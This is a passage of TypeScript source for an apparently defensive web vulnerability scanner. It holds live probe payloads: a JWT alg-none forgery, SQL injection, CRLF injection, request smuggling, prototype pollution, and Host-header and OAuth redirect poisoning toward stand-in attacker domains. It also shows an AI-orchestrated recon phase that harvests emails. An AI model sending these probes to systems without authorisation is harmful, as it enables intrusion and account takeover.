            recommendation: "Avoid exposing email addresses in HTML source. Use contact forms instead of mailto: links. If emails must be shown, obfuscate them.",
            cweId: "CWE-200",
            cvssScore: 2.5,
          });
        }
      }
    } catch { }
  }
}

// ─── SSL / TLS Analysis ───────────────────────────────────────────────────────

async function checkSSL(url: string, scanId: string) {
  const parsed = new URL(url);
  if (parsed.protocol !== "https:") {
    await addFinding(scanId, {
      type: "SSL/TLS",
      title: "Site Does Not Use HTTPS",
      description: "The target URL uses HTTP instead of HTTPS. All data transmitted between the browser and server is unencrypted and can be intercepted (Man-in-the-Middle). This includes login credentials, session tokens, and sensitive data.",
      severity: "critical",
      endpoint: url,
      method: "GET",
      evidence: `Protocol: ${parsed.protocol}`,
      recommendation: "Obtain an SSL/TLS certificate (free via Let's Encrypt) and enforce HTTPS. Redirect all HTTP traffic to HTTPS. Enable HSTS.",
      cweId: "CWE-319",
      cvssScore: 8.1,
    });
    return;
  }

  // Try HTTP version and check if it redirects to HTTPS
  const httpUrl = `http://${parsed.host}${parsed.pathname}`;
  try {
    const res = await fetchWithTimeout(httpUrl, { redirect: "manual" }, 4000);
    const location = res.headers.get("location") || "";
    if (res.status >= 200 && res.status < 300) {
      await addFinding(scanId, {
        type: "SSL/TLS",
        title: "HTTP Version Accessible — No Forced HTTPS Redirect",
        description: `The HTTP version of the site (${httpUrl}) is accessible without being redirected to HTTPS. Users who type the URL without 'https://' will connect over unencrypted HTTP.`,
        severity: "medium",
        endpoint: httpUrl,
        method: "GET",
        evidence: `HTTP ${res.status} — not redirected to HTTPS`,
        recommendation: "Configure the web server to redirect all HTTP requests to HTTPS. Enable HSTS with includeSubDomains and preload directives.",
        cweId: "CWE-319",
        cvssScore: 5.9,
      });
    }
  } catch { }
}

// ─── Advanced Attack Modules ──────────────────────────────────────────────────

async function checkJWT(targetUrl: string, scanId: string): Promise<void> {
  try {
    const res = await fetchWithTimeout(targetUrl, { headers: { "User-Agent": UA } }, 8000);
    const body = await res.text();
    const cookieHeader = res.headers.get("set-cookie") || "";
    const authHeader = res.headers.get("authorization") || "";

    const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
    const allText = body + cookieHeader + authHeader;
    const tokens = allText.match(jwtPattern) || [];

    for (const token of tokens.slice(0, 3)) {
      const parts = token.split(".");
      if (parts.length !== 3) continue;
      try {
        const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
        const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString());
        const alg = header.alg || "unknown";
        const hasExp = !!payload.exp;

        if (alg === "none" || alg === "HS256") {
          await addFinding(scanId, {
            type: "JWT",
            title: `JWT Token Detected — Algorithm: ${alg}`,
            description: `A JWT token was found in the server response using the ${alg} algorithm. Tokens using 'none' are completely unsigned. HS256 tokens may be vulnerable to brute-force attacks if the secret is weak.`,
            severity: alg === "none" ? "critical" : "medium",
            endpoint: targetUrl,
            method: "GET",
            evidence: `JWT Header: ${JSON.stringify(header)}\nPayload (decoded): ${JSON.stringify(Object.keys(payload).reduce((acc: any, k) => { if (k !== "sub") acc[k] = payload[k]; return acc; }, {}))}`,
            payload: token.substring(0, 80) + "...",
            recommendation: "Use RS256 or ES256 asymmetric algorithms. Never use 'none'. Implement proper secret rotation for HS256.",
            cweId: "CWE-347",
            cvssScore: alg === "none" ? 9.8 : 5.3,
          });
        }

        if (!hasExp) {
          await addFinding(scanId, {
            type: "JWT",
            title: "JWT Token Missing Expiry (exp) Claim",
            description: "The JWT token does not contain an 'exp' (expiration) claim, meaning it never expires. Stolen tokens remain valid indefinitely, enabling session hijacking long after the user logs out.",
            severity: "high",
            endpoint: targetUrl,
            method: "GET",
            evidence: `JWT Payload keys: ${Object.keys(payload).join(", ")} — 'exp' not present`,
            recommendation: "Always include an 'exp' claim with a short-lived expiry (15 min to 1 hr). Implement token refresh flows.",
            cweId: "CWE-613",
            cvssScore: 7.4,
          });
        }

        // Test alg=none attack
        const noneHeader = Buffer.from(JSON.stringify({ ...header, alg: "none" })).toString("base64url");
        const noneToken = `${noneHeader}.${parts[1]}.`;
        const testRes = await fetchWithTimeout(targetUrl, {
          headers: { "Authorization": `Bearer ${noneToken}`, "User-Agent": UA },
        }, 6000).catch(() => null);
        if (testRes && testRes.status === 200) {
          await addFinding(scanId, {
            type: "JWT",
            title: "JWT Algorithm Confusion — 'none' Algorithm Accepted",
            description: "The server accepted a JWT token with the algorithm set to 'none', meaning signature verification was bypassed. An attacker can forge arbitrary JWT tokens without knowing the secret key.",
            severity: "critical",
            endpoint: targetUrl,
            method: "GET",
            payload: noneToken.substring(0, 100) + "...",
            evidence: `Server returned HTTP ${testRes.status} with unsigned alg:none token`,
            recommendation: "Explicitly whitelist allowed JWT algorithms on the server. Reject any token with alg:'none' or an unexpected algorithm.",
            cweId: "CWE-347",
            cvssScore: 9.8,
          });
        }
      } catch { continue; }
    }
  } catch { }
}

async function checkGraphQL(targetUrl: string, scanId: string): Promise<void> {
  const base = new URL(targetUrl);
  const graphqlPaths = ["/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql", "/api/v1/graphql", "/query", "/gql"];

  for (const path of graphqlPaths) {
    const gqlUrl = `${base.protocol}//${base.host}${path}`;
    try {
      // Introspection query
      const introspectionQuery = `{"query":"{ __schema { types { name } } }"}`;
      const res = await fetchWithTimeout(gqlUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": UA },
        body: introspectionQuery,
      }, 6000);

      if (res.status === 200) {
        const body = await res.text();
        if (body.includes("__schema") || body.includes("types")) {
          await addFinding(scanId, {
            type: "GraphQL",
            title: "GraphQL Introspection Enabled (Schema Exposed)",
            description: `GraphQL introspection is enabled at ${gqlUrl}. This exposes the full API schema — all types, queries, mutations, and fields — to unauthenticated users. Attackers can enumerate every API operation to find hidden endpoints and sensitive data.`,
            severity: "medium",
            endpoint: gqlUrl,
            method: "POST",
            payload: introspectionQuery,
            evidence: `HTTP ${res.status} — Response contains __schema data (${body.length} bytes)`,
            recommendation: "Disable introspection in production environments. If needed, restrict it to authenticated admin users only.",
            cweId: "CWE-200",
            cvssScore: 5.3,
          });
        }

        // Batch attack test
        const batchQuery = `[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]`;
        const batchRes = await fetchWithTimeout(gqlUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json", "User-Agent": UA },
          body: batchQuery,
        }, 6000);
        if (batchRes.status === 200) {
          const batchBody = await batchRes.text();
          if (batchBody.startsWith("[")) {
            await addFinding(scanId, {
              type: "GraphQL",
              title: "GraphQL Batching Attack Vector — Multiple Operations Allowed",
              description: `${gqlUrl} accepts batched GraphQL queries (arrays of operations). Attackers can use batching to bypass rate limiting, perform credential stuffing, or amplify DoS attacks by sending thousands of operations in a single HTTP request.`,
              severity: "medium",
              endpoint: gqlUrl,
              method: "POST",
              payload: batchQuery,
              evidence: `HTTP ${batchRes.status} — Server responded with a JSON array (${batchBody.length} bytes)`,
              recommendation: "Disable query batching or limit the number of operations per request. Implement depth and complexity limiting.",
              cweId: "CWE-799",
              cvssScore: 5.8,
            });
          }
        }

        // SQL injection in GraphQL field
        const sqliQuery = `{"query":"{ user(id: \\"1 OR 1=1--\\") { id name email } }"}`;
        const sqliRes = await fetchWithTimeout(gqlUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json", "User-Agent": UA },
          body: sqliQuery,
        }, 6000);
        if (sqliRes.status === 200) {
          const sqliBody = await sqliRes.text();
          const sqliIndicators = ["syntax error", "mysql", "postgresql", "ORA-", "sqlite", "JDBC", "PDOException", "PG::", "Warning:"];
          if (sqliIndicators.some(i => sqliBody.toLowerCase().includes(i.toLowerCase()))) {
            await addFinding(scanId, {
              type: "GraphQL",
              title: "GraphQL Field — SQL Injection Indicator in Error Response",
              description: "A GraphQL query with an SQL injection payload in a field argument triggered a database error in the response, indicating potential SQL injection vulnerability in the GraphQL resolver.",
              severity: "high",
              endpoint: gqlUrl,
              method: "POST",
              payload: sqliQuery,
              evidence: sqliBody.substring(0, 300),
              recommendation: "Use parameterized queries in all GraphQL resolvers. Implement input validation for all field arguments.",
              cweId: "CWE-89",
              cvssScore: 8.2,
            });
          }
        }
        return;
      }
    } catch { continue; }
  }
}

async function checkWebSocket(targetUrl: string, crawlResult: CrawlResult, scanId: string): Promise<void> {
  const base = new URL(targetUrl);
  const wsIndicators = ["socket.io", "sockjs", "websocket", "ws://", "wss://", "/socket", "/ws", "/hub", "/signalr"];

  // Check HTML for WebSocket references
  for (const url of crawlResult.urls.slice(0, 3)) {
    try {
      const res = await fetchWithTimeout(url, { headers: { "User-Agent": UA } }, 6000);
      const body = await res.text();
      const foundWs = wsIndicators.filter(ind => body.toLowerCase().includes(ind.toLowerCase()));
      if (foundWs.length > 0) {
        await addFinding(scanId, {
          type: "WebSocket",
          title: "WebSocket Endpoint Detected — Review Authentication & Message Validation",
          description: `WebSocket-related code/libraries were found (${foundWs.join(", ")}). WebSocket connections often bypass traditional security controls. Vulnerabilities include missing authentication, lack of origin validation, message injection, and Cross-Site WebSocket Hijacking (CSWSH).`,
          severity: "info",
          endpoint: url,
          method: "GET",
          evidence: `Found WebSocket indicators in page source: ${foundWs.join(", ")}`,
          recommendation: "Validate WebSocket Origin header against an allowlist. Require authentication tokens in the WebSocket handshake or first message. Validate and sanitize all incoming WebSocket messages.",
          cweId: "CWE-1385",
          cvssScore: 6.1,
        });
        break;
      }
    } catch { continue; }
  }

  // Test for WebSocket upgrade support
  const wsPaths = ["/ws", "/socket", "/socket.io/?EIO=4&transport=polling", "/hub", "/signalr/negotiate"];
  for (const path of wsPaths) {
    const wsTestUrl = `${base.protocol}//${base.host}${path}`;
    try {
      const res = await fetchWithTimeout(wsTestUrl, {
        headers: {
          "User-Agent": UA,
          "Upgrade": "websocket",
          "Connection": "Upgrade",
          "Sec-WebSocket-Version": "13",
          "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
          "Origin": "https://evil.example.com",
        },
      }, 4000);
      if (res.status === 101 || res.status === 200 || res.headers.get("upgrade") === "websocket") {
        await addFinding(scanId, {
          type: "WebSocket",
          title: "WebSocket Endpoint Found — Cross-Site WebSocket Hijacking Risk",
          description: `A WebSocket endpoint was found at ${wsTestUrl}. The server responded to an upgrade request from an external origin (evil.example.com). If Origin is not properly validated, Cross-Site WebSocket Hijacking (CSWSH) may be possible — allowing attackers to establish authenticated WebSocket connections from malicious pages.`,
          severity: "high",
          endpoint: wsTestUrl,
          method: "GET",
          evidence: `HTTP ${res.status} — Server accepted WebSocket upgrade or returned WebSocket-related response`,
          recommendation: "Validate the Origin header against an allowlist of trusted domains. Require CSRF tokens or session cookies in the WebSocket handshake.",
          cweId: "CWE-346",
          cvssScore: 7.4,
        });
        break;
      }
    } catch { continue; }
  }
}

async function checkHostHeaderInjection(targetUrl: string, scanId: string): Promise<void> {
  const fakeHost = "evil-attacker-controlled.example.com";
  const injectHeaders = [
    { name: "X-Forwarded-Host", value: fakeHost },
    { name: "X-Host", value: fakeHost },
    { name: "X-Forwarded-Server", value: fakeHost },
    { name: "Host", value: fakeHost },
  ];

  for (const inject of injectHeaders) {
    try {
      const res = await fetchWithTimeout(targetUrl, {
        headers: { "User-Agent": UA, [inject.name]: inject.value },
      }, 6000);
      const body = await res.text();
      if (body.includes(fakeHost)) {
        await addFinding(scanId, {
          type: "Host Header Injection",
          title: `Host Header Injection via ${inject.name} — Password Reset Poisoning Risk`,
          description: `The server reflects the injected ${inject.name}: ${fakeHost} header value in its response body. This enables password reset link poisoning: an attacker who intercepts (or MitM-positions themselves for) a password reset request can inject their domain, causing victims to click links leading to the attacker's server.`,
          severity: "high",
          endpoint: targetUrl,
          method: "GET",
          payload: `${inject.name}: ${inject.value}`,
          evidence: `Injected "${fakeHost}" reflected in response body (${body.indexOf(fakeHost)} chars in)`,
          recommendation: "Never use the Host/X-Forwarded-Host headers to construct URLs in application code. Maintain an allowlist of trusted hostnames. Configure the web server to reject requests with unexpected Host values.",
          cweId: "CWE-20",
          cvssScore: 7.5,
        });
        return;
      }
    } catch { continue; }
  }

  // Check if password reset exists and test there
  const resetPaths = ["/forgot-password", "/reset-password", "/account/forgot", "/auth/reset", "/user/forgot"];
  for (const path of resetPaths) {
    const resetUrl = new URL(path, targetUrl).toString();
    try {
      const res = await fetchWithTimeout(resetUrl, {
        headers: { "User-Agent": UA, "X-Forwarded-Host": fakeHost },
      }, 5000);
      const body = await res.text();
      if (res.status === 200 && (body.toLowerCase().includes("password") || body.toLowerCase().includes("reset") || body.toLowerCase().includes("email"))) {
        await addFinding(scanId, {
          type: "Host Header Injection",
          title: "Password Reset Endpoint Potentially Vulnerable to Host Header Poisoning",
          description: `A password reset page was found at ${resetUrl}. If this endpoint uses the Host or X-Forwarded-Host header to construct the reset link URL, an attacker can poison the link to point to their own server, stealing the reset token.`,
          severity: "medium",
          endpoint: resetUrl,
          method: "GET",
          payload: `X-Forwarded-Host: ${fakeHost}`,
          evidence: `Password reset page found — Host header injection test sent. Manual verification required.`,
          recommendation: "Use a hardcoded, configured base URL for password reset links. Never dynamically construct URLs from Host headers.",
          cweId: "CWE-640",
          cvssScore: 6.5,
        });
        break;
      }
    } catch { continue; }
  }
}

async function checkCRLF(targetUrl: string, crawlResult: CrawlResult, scanId: string): Promise<void> {
  const CRLF_PAYLOADS = [
    "%0d%0aX-Injected: crlf-test",
    "%0aX-Injected:%20crlf-test",
    "%0d%0a%20X-Injected:%20crlf-test",
    "\r\nX-Injected: crlf-test",
    "%E5%98%8D%E5%98%8AX-Injected:%20crlf-test",
  ];

  for (const param of crawlResult.allParams.slice(0, 5)) {
    for (const payload of CRLF_PAYLOADS.slice(0, 2)) {
      try {
        const url = new URL(param.url);
        url.searchParams.set(param.name, payload);
        const res = await fetchWithTimeout(url.toString(), { headers: { "User-Agent": UA }, redirect: "manual" }, 5000);
        if (res.headers.get("x-injected") || (res.headers.get("location") || "").includes("crlf-test")) {
          await addFinding(scanId, {
            type: "CRLF Injection",
            title: `HTTP Response Splitting — CRLF Injection in Parameter '${param.name}'`,
            description: `The parameter '${param.name}' at ${param.url} is vulnerable to CRLF injection. Injecting carriage return (\\r) and line feed (\\n) characters allows attackers to inject arbitrary HTTP headers into server responses, enabling header injection, session fixation, XSS via header reflection, or cache poisoning.`,
            severity: "high",
            endpoint: param.url,
            parameter: param.name,
            method: "GET",
            payload: payload,
            evidence: `Injected X-Injected header appeared in response, or CRLF was reflected in Location header`,
            recommendation: "Sanitize all user-supplied values that are used in HTTP response headers. Strip \\r and \\n characters. Use framework-level response header APIs that prevent injection.",
            cweId: "CWE-113",
            cvssScore: 7.2,
          });
          return;
        }
      } catch { continue; }
    }
  }
}

async function checkHTTPRequestSmuggling(targetUrl: string, scanId: string): Promise<void> {
  const base = new URL(targetUrl);
  const smuggleUrl = `${base.protocol}//${base.host}/`;

  // CL.TE desync detection via timing
  try {
    const clTeBody = "0\r\n\r\nG";
    const start = Date.now();
    await fetchWithTimeout(smuggleUrl, {
      method: "POST",
      headers: {
        "User-Agent": UA,
        "Content-Length": "6",
        "Transfer-Encoding": "chunked",
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: clTeBody,
    }, 6000);
    const elapsed = Date.now() - start;

    if (elapsed > 4000) {
      await addFinding(scanId, {
        type: "HTTP Request Smuggling",
        title: "Potential CL.TE HTTP Request Smuggling — Timing Differential Detected",
        description: "A Content-Length/Transfer-Encoding (CL.TE) desync test produced a significant timing delay, suggesting the front-end proxy and back-end server disagree on where the request body ends. HTTP request smuggling enables bypassing access controls, hijacking user sessions, performing cache poisoning, and executing reflected XSS.",
        severity: "critical",
        endpoint: smuggleUrl,
        method: "POST",
        payload: `POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG`,
        evidence: `Request completed in ${elapsed}ms (>4000ms timeout suggests desync)`,
        recommendation: "Ensure all servers in the chain handle Transfer-Encoding and Content-Length consistently. Use HTTP/2 end-to-end. Reject requests with both headers. Update proxies (Nginx, HAProxy, etc.) to latest versions.",
        cweId: "CWE-444",
        cvssScore: 9.8,
      });
    }
  } catch { }

  // TE.CL variant
  try {
    const teCLBody = "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n";
    const start = Date.now();
    await fetchWithTimeout(smuggleUrl, {
      method: "POST",
      headers: {
        "User-Agent": UA,
        "Transfer-Encoding": "chunked",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "4",
      },
      body: teCLBody,
    }, 6000);
    const elapsed = Date.now() - start;

    if (elapsed > 4500) {
      await addFinding(scanId, {
        type: "HTTP Request Smuggling",
        title: "Potential TE.CL HTTP Request Smuggling — Timing Differential Detected",
        description: "A Transfer-Encoding/Content-Length (TE.CL) desync test produced a significant timing delay. This indicates the front-end and back-end disagree on request boundaries, potentially allowing request smuggling attacks.",
        severity: "critical",
        endpoint: smuggleUrl,
        method: "POST",
        payload: "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n[TE.CL probe]",
        evidence: `Request completed in ${elapsed}ms (>4500ms indicates potential TE.CL desync)`,
        recommendation: "Same as CL.TE — ensure consistent header handling across all proxies and backend servers. Prefer HTTP/2 throughout the stack.",
        cweId: "CWE-444",
        cvssScore: 9.8,
      });
    }
  } catch { }
}

async function checkPrototypePollution(targetUrl: string, crawlResult: CrawlResult, scanId: string): Promise<void> {
  const PP_PARAMS = ["__proto__[devnox]", "constructor[prototype][devnox]", "__proto__.devnox", "constructor.prototype.devnox"];
  const PP_VALUE = "devnox_pp_test_1337";

  for (const param of PP_PARAMS) {
    try {
      const url = new URL(targetUrl);
      url.searchParams.set(param, PP_VALUE);
      const res = await fetchWithTimeout(url.toString(), { headers: { "User-Agent": UA } }, 5000);
      const body = await res.text();
      if (body.includes(PP_VALUE) || res.status === 500) {
        await addFinding(scanId, {
          type: "Prototype Pollution",
          title: `Prototype Pollution — Server-Side via GET Parameter '${param}'`,
          description: `The server appears to process the prototype pollution parameter '${param}'. Server-Side Prototype Pollution (SSPP) can corrupt Node.js object prototypes at the server level, potentially leading to remote code execution, denial of service, or privilege escalation depending on how polluted properties are used.`,
          severity: "high",
          endpoint: targetUrl,
          parameter: param,
          method: "GET",
          payload: `${param}=${PP_VALUE}`,
          evidence: body.includes(PP_VALUE) ? `Payload value reflected in response` : `Server returned HTTP 500 — internal error triggered`,
          recommendation: "Freeze the Object prototype in Node.js using Object.freeze(Object.prototype). Use libraries like deep-copy or object-merge that protect against prototype pollution. Validate all input keys before merging.",
          cweId: "CWE-1321",
          cvssScore: 8.0,
        });
        return;
      }
    } catch { continue; }
  }

  // Test via JSON POST body
  for (const form of crawlResult.forms.filter(f => f.method?.toLowerCase() === "post").slice(0, 2)) {
    try {
      const ppJson = `{"__proto__":{"devnox":${JSON.stringify(PP_VALUE)}}}`;
      const res = await fetchWithTimeout(form.action || targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": UA },
        body: ppJson,
      }, 5000);
      const body = await res.text();
      if (body.includes(PP_VALUE) || res.status === 500) {
        await addFinding(scanId, {
          type: "Prototype Pollution",
          title: "Prototype Pollution — Server-Side via JSON Body Merge",
          description: "The server accepted a JSON body with __proto__ key and may have merged it unsafely. If the application uses unsafe deep-merge functions (lodash.merge, jQuery.extend, etc.) with user-controlled data, prototype pollution can corrupt the server's object model.",
          severity: "high",
          endpoint: form.action || targetUrl,
          method: "POST",
          payload: ppJson,
          evidence: body.includes(PP_VALUE) ? `Pollution value reflected in response` : `HTTP 500 triggered by malformed prototype payload`,
          recommendation: "Use Object.create(null) for merge targets. Avoid lodash.merge, _.defaultsDeep with untrusted input. Validate and sanitize JSON before merging.",
          cweId: "CWE-1321",
          cvssScore: 8.0,
        });
        return;
      }
    } catch { continue; }
  }
}

async function checkOAuth(targetUrl: string, crawlResult: CrawlResult, scanId: string): Promise<void> {
  const base = new URL(targetUrl);
  const oauthPaths = [
    "/oauth/authorize", "/oauth2/authorize", "/auth/authorize", "/auth/oauth",
    "/connect/authorize", "/login/oauth", "/sso", "/auth/login",
    "/.well-known/openid-configuration",
  ];

  for (const path of oauthPaths) {
    const oauthUrl = `${base.protocol}//${base.host}${path}`;
    try {
      const res = await fetchWithTimeout(oauthUrl, { headers: { "User-Agent": UA }, redirect: "manual" }, 5000);
      const body = await res.text();

      if (res.status === 200 || res.status === 302) {
        const isOAuth = body.includes("client_id") || body.includes("redirect_uri") || body.includes("response_type") ||
          body.includes("authorization_endpoint") || res.headers.get("location")?.includes("oauth") ||
          res.headers.get("location")?.includes("authorize");

        if (!isOAuth && res.status !== 200) continue;

        // Test open redirect in redirect_uri
        const evilRedirect = "https://evil-attacker.example.com/callback";
        const openRedirectUrl = new URL(oauthUrl);
        openRedirectUrl.searchParams.set("client_id", "test");
        openRedirectUrl.searchParams.set("redirect_uri", evilRedirect);
        openRedirectUrl.searchParams.set("response_type", "code");
        openRedirectUrl.searchParams.set("scope", "openid profile");

        const redirectRes = await fetchWithTimeout(openRedirectUrl.toString(), {
          headers: { "User-Agent": UA },
          redirect: "manual",
        }, 5000);

        if (redirectRes.headers.get("location")?.includes("evil-attacker.example.com")) {
          await addFinding(scanId, {
            type: "OAuth",
            title: "OAuth Open Redirect — Unvalidated redirect_uri Parameter",
            description: `The OAuth authorization endpoint at ${oauthUrl} redirected to an attacker-controlled redirect_uri (${evilRedirect}). An attacker can steal authorization codes or access tokens by sending victims a crafted OAuth authorization link that redirects to their server after authentication.`,
            severity: "critical",
            endpoint: oauthUrl,
            method: "GET",
            payload: `redirect_uri=${evilRedirect}`,
            evidence: `Server redirected to: ${redirectRes.headers.get("location")}`,
            recommendation: "Maintain a strict allowlist of valid redirect_uri values registered during OAuth client registration. Reject all requests with redirect_uris not exactly matching the allowlist.",
            cweId: "CWE-601",
            cvssScore: 9.0,
          });
        }

        // Check for missing state parameter
        const noStateUrl = new URL(oauthUrl);
        noStateUrl.searchParams.set("client_id", "test");
        noStateUrl.searchParams.set("redirect_uri", targetUrl);
        noStateUrl.searchParams.set("response_type", "code");
        const noStateRes = await fetchWithTimeout(noStateUrl.toString(), {
          headers: { "User-Agent": UA },
          redirect: "manual",
        }, 5000);

        if (noStateRes.status === 200 || (noStateRes.status === 302 && !noStateRes.headers.get("location")?.includes("error"))) {
          await addFinding(scanId, {
            type: "OAuth",
            title: "OAuth Flow Accepts Requests Without 'state' Parameter — CSRF Risk",
            description: "The OAuth authorization request was accepted without a 'state' parameter. The state parameter is required to prevent Cross-Site Request Forgery (CSRF) attacks in OAuth flows. Without it, attackers can trick authenticated users into linking their accounts with attacker-controlled OAuth tokens.",
            severity: "high",
            endpoint: oauthUrl,
            method: "GET",
            payload: `?client_id=test&redirect_uri=...&response_type=code (no state)`,
            evidence: `HTTP ${noStateRes.status} — Request without state parameter was not rejected`,
            recommendation: "Require and validate the state parameter in all OAuth authorization requests. Use a cryptographically random, session-bound state value.",
            cweId: "CWE-352",
            cvssScore: 7.3,
          });
        }

        // Check for implicit flow
        const implicitUrl = new URL(oauthUrl);
        implicitUrl.searchParams.set("response_type", "token");
        implicitUrl.searchParams.set("client_id", "test");
        const implicitRes = await fetchWithTimeout(implicitUrl.toString(), { headers: { "User-Agent": UA }, redirect: "manual" }, 5000);
        if (implicitRes.status === 200 || implicitRes.status === 302) {
          const implBody = await implicitRes.text().catch(() => "");
          if (!implBody.includes("unsupported_response_type") && !implBody.includes("error")) {
            await addFinding(scanId, {
              type: "OAuth",
              title: "OAuth Implicit Flow Supported — Access Tokens Exposed in URL",
              description: "The OAuth server appears to support the implicit flow (response_type=token). Implicit flow delivers access tokens directly in URL fragments, exposing them in browser history, server logs, and Referer headers. This flow is deprecated in OAuth 2.1.",
              severity: "medium",
              endpoint: oauthUrl,
              method: "GET",
              payload: "response_type=token",
              evidence: `HTTP ${implicitRes.status} — Server did not reject implicit flow request`,
              recommendation: "Migrate to Authorization Code flow with PKCE (Proof Key for Code Exchange). Disable support for the implicit flow.",
              cweId: "CWE-522",
              cvssScore: 6.5,
            });
          }
        }

        break;
      }
    } catch { continue; }
  }
}

async function checkParameterPollution(targetUrl: string, crawlResult: CrawlResult, scanId: string): Promise<void> {
  for (const param of crawlResult.allParams.slice(0, 8)) {
    try {
      // Send same param twice with different values
      const originalVal = param.value || "test";
      const url = `${param.url}?${param.name}=${encodeURIComponent(originalVal)}&${param.name}=HPP_TEST_${param.name}`;
      const res = await fetchWithTimeout(url, { headers: { "User-Agent": UA } }, 5000);
      const body = await res.text();

      // Check if both values are used (dangerous) or if HPP indicator is in response
      if (body.includes(`HPP_TEST_${param.name}`)) {
        await addFinding(scanId, {
          type: "HTTP Parameter Pollution",
          title: `HTTP Parameter Pollution — Duplicate '${param.name}' Parameter Accepted`,
          description: `The server processes duplicate occurrences of the '${param.name}' parameter and reflects the injected value. HTTP Parameter Pollution (HPP) can be used to bypass WAF rules, override security controls, manipulate backend query logic, or inject additional parameters into third-party API calls.`,
          severity: "medium",
          endpoint: param.url,
          parameter: param.name,
          method: "GET",
          payload: `${param.name}=${originalVal}&${param.name}=HPP_TEST_${param.name}`,
          evidence: `Injected HPP_TEST_${param.name} value appeared in response body`,
          recommendation: "Define explicit rules for how duplicate parameters are handled. Use the first or last value consistently. Log and alert on duplicate parameter occurrences.",
          cweId: "CWE-20",
          cvssScore: 5.3,
        });
        return;
      }
    } catch { continue; }
  }
}

async function checkClickjacking(targetUrl: string, scanId: string): Promise<void> {
  try {
    const res = await fetchWithTimeout(targetUrl, { headers: { "User-Agent": UA } }, 6000);
    const xfo = res.headers.get("x-frame-options") || "";
    const csp = res.headers.get("content-security-policy") || "";
    const hasFrameAncestors = csp.toLowerCase().includes("frame-ancestors");

    if (!xfo && !hasFrameAncestors) {
      await addFinding(scanId, {
        type: "Clickjacking",
        title: "No Clickjacking Protection — Page Can Be Embedded in Iframes",
        description: "The response lacks both X-Frame-Options and Content-Security-Policy frame-ancestors directives. The page can be embedded in an attacker-controlled iframe, enabling clickjacking attacks where users are tricked into clicking hidden interface elements, potentially performing unintended actions (account deletion, fund transfers, etc.).",
        severity: "medium",
        endpoint: targetUrl,
        method: "GET",
        evidence: `X-Frame-Options: ${xfo || "(missing)"}\nCSP frame-ancestors: ${hasFrameAncestors ? "present" : "(missing)"}`,
        recommendation: "Add: X-Frame-Options: DENY (or SAMEORIGIN). Add frame-ancestors directive in Content-Security-Policy header. Prefer CSP frame-ancestors as it provides more granular control.",
        cweId: "CWE-1021",
        cvssScore: 6.1,
      });
    }
  } catch { }
}

// ─── Main Scan Runner ─────────────────────────────────────────────────────────

export async function runScan(scanId: string) {
  try {
    const scan = await db.select().from(scansTable).where(eq(scansTable.id, scanId)).limit(1);
    if (!scan[0]) { logger.error({ scanId }, "Scan not found"); return; }

    const { targetUrl, modules, scanType } = scan[0];
    const enabled = (modules as string[]) || ["recon", "headers", "xss", "sqli", "ssrf", "csrf"];

    await db.update(scansTable).set({ status: "running", startedAt: new Date() }).where(eq(scansTable.id, scanId));
    scanEmitter.emit(`scan:${scanId}`, { type: "status", data: { status: "running" } });

    // ── Phase 1: Reconnaissance ──────────────────────────────────────────────
    await updatePhase(scanId, "recon", 2);
    await addEvent(scanId, "recon", `[RECON] Initiating autonomous scan of ${targetUrl}`, "info");
    await sleep(400);

    if (await isCancelled(scanId)) return;

    await addEvent(scanId, "recon", "[RECON] Fingerprinting technology stack...", "info");
    const techStack = await detectTechStack(targetUrl);
    await db.update(scansTable).set({ techStack }).where(eq(scansTable.id, scanId));
    await addEvent(scanId, "recon", `[RECON] Tech stack: ${techStack.length > 0 ? techStack.join(", ") : "Not disclosed"}`, "success");

    // ── Enhanced OSINT Recon Engine ──────────────────────────────────────────
    await updatePhase(scanId, "recon", 4);
    await addEvent(scanId, "recon", "[RECON] Launching OSINT intelligence gathering — DNS, WHOIS, email harvest, subdomain enum...", "info");
    let reconResult;
    try {
      reconResult = await runReconEngine(targetUrl, scanId);
      const subNames = reconResult.subdomains.map(s => s.name);
      await db.update(scansTable).set({ subdomains: subNames, techStack: reconResult.techStack.length > 0 ? reconResult.techStack : techStack }).where(eq(scansTable.id, scanId));
      await addEvent(scanId, "recon", `[RECON] OSINT complete — ${reconResult.ipAddresses.length} IPs, ${reconResult.subdomains.length} subdomains, ${reconResult.emails.length} emails, ${reconResult.dnsRecords.length} DNS records`, "success");
      if (reconResult.cloudProviders.length > 0) {
        await addEvent(scanId, "recon", `[RECON] Cloud infrastructure detected: ${reconResult.cloudProviders.join(", ")}`, "info");
      }
      if (reconResult.networkInfo.org) {
        await addEvent(scanId, "recon", `[RECON] Network: ${reconResult.networkInfo.org} | ${reconResult.networkInfo.country || "Unknown"} | ASN: ${reconResult.networkInfo.asn || "N/A"}`, "info");
      }
    } catch (err) {
      logger.warn({ err }, "OSINT recon failed, continuing");
      await addEvent(scanId, "recon", "[RECON] OSINT gathering partially failed, continuing with scan...", "warning");
    }

    // ── AI Orchestrator Decision ─────────────────────────────────────────────
    if (reconResult) {
      try {
        await addEvent(scanId, "recon", "[AI] AI Orchestrator analyzing recon data to plan attack strategy...", "info");
        const aiDecision = await analyzeReconWithAI(scanId, new URL(targetUrl).hostname, {
          subdomainsFound: reconResult.subdomains.length,
          emailsFound: reconResult.emails.length,
          techStack: reconResult.techStack,
          cloudProviders: reconResult.cloudProviders,
          ipCount: reconResult.ipAddresses.length,
          dnsRecordCount: reconResult.dnsRecords.length,
        });
